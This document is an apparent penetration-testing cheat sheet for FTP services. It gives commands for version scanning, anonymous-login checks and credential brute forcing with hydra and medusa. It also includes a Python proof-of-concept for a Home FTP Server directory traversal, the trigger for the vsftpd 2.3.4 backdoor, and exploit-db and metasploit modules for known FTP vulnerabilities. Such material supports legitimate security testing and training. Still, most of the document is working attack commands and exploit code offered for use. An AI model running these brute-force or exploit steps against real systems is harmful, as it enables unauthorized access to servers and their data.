# FTP

## Version Detection

### nmap

Included in the default flag `-sV`

```bash
nmap -sV -sC 192.0.2.1
```

### metasploit

```console
msf > use auxiliary/scanner/ftp/ftp_version
```

## File Enumeration

### ftp

```bash
ftp 192.0.2.1
```

### lftp

```bash
lftp 192.0.2.1
```

### FileZilla

## Anonymous Login

Enter `anonymous` for the username and 

```shell
$ ftp 192.0.2.1
Connected to 192.0.2.1
220 (vsFTPd 3.0.3)
Name (192.0.2.1:user): anonymous
230 Login successful.
Remote system type is UNIX
Using binary mode to transfer files.
ftp> 
```

### Check Anonymous Login

#### nmap

```bash
nmap -p 21 192.0.2.1 --script ftp-anon
```

#### metasploit

```console
msf > use auxiliary/scanner/ftp/anonymous
```

## Brute Force User

### Default Credentials

- https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt

### hydra

```bash
hydra -L usernames.txt -P passwords.txt ftp://192.0.2.1
```

```bash
hydra -L usernames.txt -P passwords.txt 192.0.2.1 ftp
```

### medusa

```bash
medusa -h 192.0.2.1 -U usernames.txt -P passwords.txt -M ftp
```

## CVEs

### HOME FTP Server Directory Traversal (CVE-2009-4053)

> Multiple directory traversal vulnerabilities in Home FTP Server 1.10.1.139 allow remote authenticated users to (1) create arbitrary directories via directory traversal sequences in an MKD command or (2) create files with any contents in arbitrary directories via directory traversal sequences in a file upload request. NOTE: the provenance of this information is unknown; the details are obtained solely from third party information.

#### PoC

The following Python script creates a `foo` directory in the parent directory

```python
import socket

hostname = '192.0.2.1'
port = 21
username = 'anonymous'
password = ''

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((hostname, port))
sock.recv(1024)
sock.send("USER {}\r\n".format(username))
sock.recv(1024)
sock.send("PASS {}\r\n".format(password))
sock.recv(1024)
sock.send("MKD ../foo\r\n")
sock.close()
```

#### Exploitdb

```bash
searchsploit -m 10162
```

### vsftpd v2.3.4 Backdoor

Some attackers managed to place a backdoor in vsFTPd 2.3.4 [7].

#### nmap Scan

```bash
nmap --script ftp-vsftpd-backdoor -p 21 192.0.2.1
```

#### Manual Exploit

1. Login with any user that ends with `":)"`
2. Connect directly to port 6200

#### Exploitdb

```bash
searchsploit -m 49757
```

#### Metasploit

```console
msf > use exploit/unix/ftp/vsftpd_234_backdoor
```

### FTPShell Client 6.70 Buffer Overflow (CVE-2018-7573)

> An issue was discovered in FTPShell Client 6.7. A remote FTP server can send 400 characters of 'F' in conjunction with the FTP 220 response code to crash the application; after this overflow, one can run arbitrary code on the victim machine. This is similar to CVE-2009-3364 and CVE-2017-6465.

#### Exploitdb

```bash
searchsploit -m 44596
```

#### Metasploit

```console
msf > use exploit/windows/ftp/ftpshell_cli_bof
```

## Tools

- [lftp](https://github.com/lavv17/lftp) - sophisticated command line file transfer program (ftp, http, sftp, fish, torrent)